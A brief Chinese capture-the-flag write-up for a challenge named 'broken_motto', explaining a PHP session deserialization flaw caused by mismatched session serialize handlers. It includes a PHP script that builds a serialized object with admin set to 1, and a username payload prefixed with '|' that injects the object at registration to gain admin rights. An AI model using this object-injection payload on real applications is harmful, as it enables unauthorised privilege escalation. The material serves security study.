## broken_motto

[学习链接](https://www.mi1k7ea.com/2019/04/21/PHP-session反序列化漏洞/)

在profile.php里面里面有一行注释：

```
//ini_set('session.serialize_handler','php_serialize');
```

这行代码使用的Session序列化选择器是php_serialize，注释之后默认使用的是php

两种选择器的不同的处理方式导致了session反序列化的漏洞的产生，存session的时候，存入php_serialize经过serialize()函数序列处理的数组

读取的时候php以键名 ＋ 竖线 ＋ 经过 serialize() 函数序列化的数据处理如果你注册的时候加一个|，可以造成对象注入。

exp:
```PHP
<?php

class info{
    public $admin;
    public $username;
    public $motto;

}

$pop = new info();
$pop->admin = 1;
echo serialize($pop);
```
payload：

在注册的时候username输入：

```PHP
|O:4:"info":3:{s:5:"admin";i:1;s:8:"username";N;s:5:"motto";N;}
```

password和motto随便；